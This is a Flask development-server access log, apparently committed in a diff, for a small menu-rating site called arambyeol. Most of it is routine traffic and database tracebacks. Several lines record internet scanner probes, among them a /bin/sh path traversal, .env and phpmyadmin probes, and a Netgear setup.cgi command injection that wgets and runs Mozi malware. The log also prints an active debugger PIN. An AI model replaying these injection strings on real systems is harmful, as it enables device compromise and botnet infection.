+182.31.164.169 - - [21/Nov/2021 01:14:04] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:14:04] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:14:04] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:14:04] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:14:04] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:14:04] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:14:04] "GET /static/images/login.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:14:04] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:14:04] "POST /api/menu_score HTTP/1.1" 200 -
+ * Detected change in '/home/opc/arambyeol/get_data.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 102-686-678
+182.31.164.169 - - [21/Nov/2021 01:20:17] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:20:18] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:20:18] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:20:18] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:20:18] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:20:18] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:20:18] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:20:18] "GET /static/images/login.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:20:18] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:20:18] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:20:19] "POST /api/menu_score HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:20:23] "GET /member/login.html HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:20:23] "GET /static/css/member/login.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:20:23] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:20:28] "POST /member/login.html HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 2091, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 2076, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 2073, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1518, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1516, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1502, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/opc/arambyeol/__init__.py", line 60, in login
+    check_id = check_userId(id)
+  File "/home/opc/arambyeol/user.py", line 31, in check_userId
+    cursor.execute(sql)
+  File "/usr/local/lib/python3.8/dist-packages/pymysql/cursors.py", line 148, in execute
+    result = self._query(query)
+  File "/usr/local/lib/python3.8/dist-packages/pymysql/cursors.py", line 310, in _query
+    conn.query(q)
+  File "/usr/local/lib/python3.8/dist-packages/pymysql/connections.py", line 548, in query
+    self._affected_rows = self._read_query_result(unbuffered=unbuffered)
+  File "/usr/local/lib/python3.8/dist-packages/pymysql/connections.py", line 775, in _read_query_result
+    result.read()
+  File "/usr/local/lib/python3.8/dist-packages/pymysql/connections.py", line 1156, in read
+    first_packet = self.connection._read_packet()
+  File "/usr/local/lib/python3.8/dist-packages/pymysql/connections.py", line 725, in _read_packet
+    packet.raise_for_error()
+  File "/usr/local/lib/python3.8/dist-packages/pymysql/protocol.py", line 221, in raise_for_error
+    err.raise_mysql_exception(self._data)
+  File "/usr/local/lib/python3.8/dist-packages/pymysql/err.py", line 143, in raise_mysql_exception
+    raise errorclass(errno, errval)
+pymysql.err.ProgrammingError: (1146, "Table 'arambyeol.users' doesn't exist")
+182.31.164.169 - - [21/Nov/2021 01:20:28] "GET /member/login.html?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:20:28] "GET /member/login.html?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:20:28] "GET /member/login.html?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:20:28] "GET /member/login.html?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:20:28] "GET /member/login.html?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:20:49] "POST /member/login.html HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 2091, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 2076, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 2073, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1518, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1516, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1502, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/opc/arambyeol/__init__.py", line 60, in login
+    check_id = check_userId(id)
+  File "/home/opc/arambyeol/user.py", line 31, in check_userId
+    cursor.execute(sql)
+  File "/usr/local/lib/python3.8/dist-packages/pymysql/cursors.py", line 148, in execute
+    result = self._query(query)
+  File "/usr/local/lib/python3.8/dist-packages/pymysql/cursors.py", line 310, in _query
+    conn.query(q)
+  File "/usr/local/lib/python3.8/dist-packages/pymysql/connections.py", line 548, in query
+    self._affected_rows = self._read_query_result(unbuffered=unbuffered)
+  File "/usr/local/lib/python3.8/dist-packages/pymysql/connections.py", line 775, in _read_query_result
+    result.read()
+  File "/usr/local/lib/python3.8/dist-packages/pymysql/connections.py", line 1156, in read
+    first_packet = self.connection._read_packet()
+  File "/usr/local/lib/python3.8/dist-packages/pymysql/connections.py", line 725, in _read_packet
+    packet.raise_for_error()
+  File "/usr/local/lib/python3.8/dist-packages/pymysql/protocol.py", line 221, in raise_for_error
+    err.raise_mysql_exception(self._data)
+  File "/usr/local/lib/python3.8/dist-packages/pymysql/err.py", line 143, in raise_mysql_exception
+    raise errorclass(errno, errval)
+pymysql.err.ProgrammingError: (1146, "Table 'arambyeol.users' doesn't exist")
+182.31.164.169 - - [21/Nov/2021 01:20:49] "GET /member/login.html?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:20:49] "GET /member/login.html?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:20:49] "GET /member/login.html?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:20:49] "GET /member/login.html?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:20:49] "GET /member/login.html?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:21:13] "POST /member/login.html HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 2091, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 2076, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 2073, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1518, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1516, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1502, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/opc/arambyeol/__init__.py", line 60, in login
+    check_id = check_userId(id)
+  File "/home/opc/arambyeol/user.py", line 31, in check_userId
+    cursor.execute(sql)
+  File "/usr/local/lib/python3.8/dist-packages/pymysql/cursors.py", line 148, in execute
+    result = self._query(query)
+  File "/usr/local/lib/python3.8/dist-packages/pymysql/cursors.py", line 310, in _query
+    conn.query(q)
+  File "/usr/local/lib/python3.8/dist-packages/pymysql/connections.py", line 548, in query
+    self._affected_rows = self._read_query_result(unbuffered=unbuffered)
+  File "/usr/local/lib/python3.8/dist-packages/pymysql/connections.py", line 775, in _read_query_result
+    result.read()
+  File "/usr/local/lib/python3.8/dist-packages/pymysql/connections.py", line 1156, in read
+    first_packet = self.connection._read_packet()
+  File "/usr/local/lib/python3.8/dist-packages/pymysql/connections.py", line 725, in _read_packet
+    packet.raise_for_error()
+  File "/usr/local/lib/python3.8/dist-packages/pymysql/protocol.py", line 221, in raise_for_error
+    err.raise_mysql_exception(self._data)
+  File "/usr/local/lib/python3.8/dist-packages/pymysql/err.py", line 143, in raise_mysql_exception
+    raise errorclass(errno, errval)
+pymysql.err.ProgrammingError: (1146, "Table 'arambyeol.users' doesn't exist")
+182.31.164.169 - - [21/Nov/2021 01:21:13] "GET /member/login.html?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:21:13] "GET /member/login.html?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:21:13] "GET /member/login.html?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:21:13] "GET /member/login.html?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:21:13] "GET /member/login.html?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+ * Detected change in '/home/opc/arambyeol/db.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 102-686-678
+182.31.164.169 - - [21/Nov/2021 01:24:28] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:24:28] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:28] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:28] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:28] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:28] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:29] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:24:29] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:24:29] "GET /static/images/login.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:30] "GET /member/login.html HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:24:30] "GET /static/css/member/login.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:30] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:32] "POST /member/login.html HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:24:32] "GET /static/css/member/login.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:32] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:34] "GET /member/register.html HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:24:40] "POST /member/register.html HTTP/1.1" 302 -
+182.31.164.169 - - [21/Nov/2021 01:24:40] "GET /member/login.html HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:24:40] "GET /static/css/member/login.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:40] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:45] "POST /member/login.html HTTP/1.1" 302 -
+182.31.164.169 - - [21/Nov/2021 01:24:45] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:24:46] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:46] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:46] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:46] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:46] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:46] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:24:46] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:24:46] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:47] "POST /api/menu_score HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:24:48] "GET /static/images/full_star.png HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:24:49] "POST /api/score HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:24:49] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:24:49] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:49] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:49] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:49] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:49] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:49] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:24:49] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:49] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:24:50] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:50] "POST /api/menu_score HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:24:51] "GET /static/images/full_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:52] "POST /api/score HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:24:52] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:24:52] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:52] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:52] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:52] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:52] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:52] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:24:52] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:52] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:24:53] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:24:53] "POST /api/menu_score HTTP/1.1" 200 -
+45.146.164.110 - - [21/Nov/2021 01:25:43] "POST /cgi-bin/../../../../bin/sh HTTP/1.1" 404 -
+45.146.164.110 - - [21/Nov/2021 02:01:12] "GET / HTTP/1.1" 200 -
+220.84.188.239 - - [21/Nov/2021 02:02:28] "GET / HTTP/1.1" 200 -
+220.84.188.239 - - [21/Nov/2021 02:02:28] "GET /static/js/index.js HTTP/1.1" 200 -
+220.84.188.239 - - [21/Nov/2021 02:02:28] "GET /static/css/index.css HTTP/1.1" 200 -
+220.84.188.239 - - [21/Nov/2021 02:02:28] "GET /static/images/logo.png HTTP/1.1" 200 -
+220.84.188.239 - - [21/Nov/2021 02:02:28] "GET /static/images/empty_star.png HTTP/1.1" 200 -
+220.84.188.239 - - [21/Nov/2021 02:02:28] "GET /static/images/x_icon.png HTTP/1.1" 200 -
+220.84.188.239 - - [21/Nov/2021 02:02:29] "POST /api/session_check HTTP/1.1" 200 -
+220.84.188.239 - - [21/Nov/2021 02:02:29] "GET /api/list HTTP/1.1" 200 -
+220.84.188.239 - - [21/Nov/2021 02:02:29] "GET /static/images/login.png HTTP/1.1" 200 -
+220.84.188.239 - - [21/Nov/2021 02:02:30] "GET /static//images/favicon.ico HTTP/1.1" 308 -
+220.84.188.239 - - [21/Nov/2021 02:02:30] "GET /static/images/favicon.ico HTTP/1.1" 200 -
+117.50.42.111 - - [21/Nov/2021 02:25:05] "GET / HTTP/1.1" 200 -
+117.50.42.111 - - [21/Nov/2021 02:25:06] "GET / HTTP/1.1" 200 -
+88.9.119.217 - - [21/Nov/2021 02:32:19] "GET / HTTP/1.1" 200 -
+154.209.125.25 - - [21/Nov/2021 02:34:15] "GET / HTTP/1.1" 200 -
+103.28.70.206 - - [21/Nov/2021 02:38:42] "GET /.env HTTP/1.1" 404 -
+103.28.70.206 - - [21/Nov/2021 02:38:43] "POST / HTTP/1.1" 405 -
+186.33.87.219 - - [21/Nov/2021 03:40:55] "GET / HTTP/1.1" 200 -
+192.241.211.96 - - [21/Nov/2021 03:42:30] "GET /portal/redlion HTTP/1.1" 404 -
+20.119.59.27 - - [21/Nov/2021 03:47:11] "GET /.env HTTP/1.1" 404 -
+20.119.59.27 - - [21/Nov/2021 03:47:11] "POST / HTTP/1.1" 405 -
+13.124.15.22 - - [21/Nov/2021 04:11:08] "GET /phpmyadmin/index.php HTTP/1.1" 404 -
+13.124.15.22 - - [21/Nov/2021 04:11:08] "GET /phpmyadmin4.8.5/index.php HTTP/1.1" 404 -
+13.124.15.22 - - [21/Nov/2021 04:11:08] "GET /pmd/index.php HTTP/1.1" 404 -
+13.124.15.22 - - [21/Nov/2021 04:11:08] "GET /index.php HTTP/1.1" 404 -
+163.53.182.167 - - [21/Nov/2021 04:13:30] "GET / HTTP/1.1" 200 -
+192.241.207.66 - - [21/Nov/2021 04:55:36] "GET /actuator/health HTTP/1.1" 404 -
+180.149.125.165 - - [21/Nov/2021 05:22:06] "GET /c/ HTTP/1.1" 404 -
+209.17.97.114 - - [21/Nov/2021 06:03:28] "GET / HTTP/1.1" 200 -
+34.140.248.32 - - [21/Nov/2021 06:32:04] "GET / HTTP/1.1" 200 -
+218.111.16.200 - - [21/Nov/2021 06:33:29] "GET / HTTP/1.1" 200 -
+209.141.34.220 - - [21/Nov/2021 07:01:18] "GET /config/getuser?index=0 HTTP/1.1" 404 -
+138.118.235.163 - - [21/Nov/2021 07:23:40] "GET / HTTP/1.1" 200 -
+128.14.209.162 - - [21/Nov/2021 07:29:43] "GET / HTTP/1.1" 200 -
+198.98.49.124 - - [21/Nov/2021 07:42:52] "GET / HTTP/1.1" 200 -
+209.141.46.14 - - [21/Nov/2021 07:57:09] "GET /config/getuser?index=0 HTTP/1.1" 404 -
+182.119.3.123 - - [21/Nov/2021 08:06:02] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 -
+209.141.34.220 - - [21/Nov/2021 09:01:32] "GET /config/getuser?index=0 HTTP/1.1" 404 -
+37.44.238.177 - - [21/Nov/2021 09:41:07] "GET /dispatch.asp HTTP/1.1" 404 -
+186.155.245.36 - - [21/Nov/2021 09:57:10] "GET / HTTP/1.1" 200 -
+181.94.247.96 - - [21/Nov/2021 10:48:40] "GET / HTTP/1.1" 200 -
+77.38.242.19 - - [21/Nov/2021 11:17:25] "GET / HTTP/1.1" 200 -
+94.102.56.151 - - [21/Nov/2021 11:57:11] "GET / HTTP/1.1" 200 -
+45.137.23.85 - - [21/Nov/2021 12:11:01] "GET / HTTP/1.1" 200 -
+209.17.96.98 - - [21/Nov/2021 12:31:54] code 400, message Bad request version ('À(À$À\x14À')
+209.17.96.98 - - [21/Nov/2021 12:31:54] " ä  à6²<Bºfä,'ª!ÑáPû /!VZ  hÌÌÀ/À+À0À,ÀÀÀ'À#ÀÀ	À(À$ÀÀ" HTTPStatus.BAD_REQUEST -
+194.85.248.160 - - [21/Nov/2021 12:39:52] "GET / HTTP/1.1" 200 -
+186.67.158.117 - - [21/Nov/2021 13:05:19] "GET / HTTP/1.0" 200 -
+198.98.49.124 - - [21/Nov/2021 13:18:11] "GET / HTTP/1.1" 200 -
+209.141.34.220 - - [21/Nov/2021 13:27:31] "GET /config/getuser?index=0 HTTP/1.1" 404 -
+193.118.53.194 - - [21/Nov/2021 13:48:06] "GET / HTTP/1.1" 200 -
+94.232.43.63 - - [21/Nov/2021 14:05:45] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+94.232.43.63 - - [21/Nov/2021 14:05:45] "  ,'à     Cookie: mstshash=Domain" HTTPStatus.BAD_REQUEST -
+94.232.43.63 - - [21/Nov/2021 14:05:46] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+94.232.43.63 - - [21/Nov/2021 14:05:46] "  ,'à     Cookie: mstshash=Domain" HTTPStatus.BAD_REQUEST -
+182.31.164.169 - - [21/Nov/2021 14:07:22] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 14:07:22] "GET /static/css/index.css HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 14:07:22] "GET /static/images/x_icon.png HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 14:07:22] "GET /static/images/logo.png HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 14:07:22] "GET /static/images/empty_star.png HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 14:07:22] "GET /static/js/index.js HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 14:07:23] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 14:07:23] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 14:07:23] "GET /static/images/login.png HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 14:07:23] "GET /static//images/favicon.ico HTTP/1.1" 308 -
+182.31.164.169 - - [21/Nov/2021 14:07:23] "GET /static/images/favicon.ico HTTP/1.1" 200 -
+103.220.89.56 - - [21/Nov/2021 14:12:37] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 -
+209.17.97.74 - - [21/Nov/2021 14:13:10] "GET / HTTP/1.0" 200 -
+93.67.34.138 - - [21/Nov/2021 14:16:18] "GET / HTTP/1.0" 200 -
+203.255.3.172 - - [21/Nov/2021 14:34:14] "GET / HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:34:14] "GET /static/css/index.css HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:34:14] "GET /static/images/logo.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 14:34:14] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 14:34:14] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 14:34:14] "GET /static/js/index.js HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:34:15] "POST /api/session_check HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:34:15] "GET /api/list HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:34:15] "GET /static/images/login.png HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:44:20] "GET / HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:44:21] "GET /static/css/index.css HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:44:21] "GET /static/js/index.js HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:44:21] "GET /static/images/logo.png HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:44:21] "GET /static/images/x_icon.png HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:44:21] "GET /static/images/empty_star.png HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:44:21] "POST /api/session_check HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:44:21] "GET /api/list HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:44:21] "GET /static/images/login.png HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:44:21] "GET /static//images/favicon.ico HTTP/1.1" 308 -
+203.255.3.172 - - [21/Nov/2021 14:44:21] "GET /static/images/favicon.ico HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:44:23] "POST /api/menu_score HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:44:26] "GET /member/login.html HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:44:26] "GET /static/css/member/login.css HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:44:26] "GET /static/images/logo.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 14:44:31] "POST /member/login.html HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:44:31] "GET /static/css/member/login.css HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 14:44:32] "GET /static/images/logo.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 14:44:35] "GET /member/register.html HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:44:40] "POST /member/register.html HTTP/1.1" 302 -
+203.255.3.172 - - [21/Nov/2021 14:44:40] "GET /member/login.html HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:44:40] "GET /static/images/logo.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 14:44:40] "GET /static/css/member/login.css HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 14:44:45] "POST /member/login.html HTTP/1.1" 302 -
+203.255.3.172 - - [21/Nov/2021 14:44:45] "GET / HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:44:45] "GET /static/css/index.css HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 14:44:45] "GET /static/js/index.js HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 14:44:45] "GET /static/images/logo.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 14:44:45] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 14:44:45] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 14:44:45] "POST /api/session_check HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:44:45] "GET /api/list HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:44:45] "GET /static/images/logout.png HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:44:50] "POST /api/menu_score HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:44:50] "GET /static/images/full_star.png HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:44:52] "POST /api/score HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:44:53] "GET / HTTP/1.1" 200 -
+203.255.3.172 - - [21/Nov/2021 14:44:53] "GET /static/css/index.css HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 14:44:53] "GET /static/js/index.js HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 14:44:53] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 14:44:53] "GET /static/images/logo.png HTTP/1.1" 304 -
+203.255.3.172 - - [21/Nov/2021 14:44:53] "GET /static/images/empty_star.png HTTP/1.1" 304 -
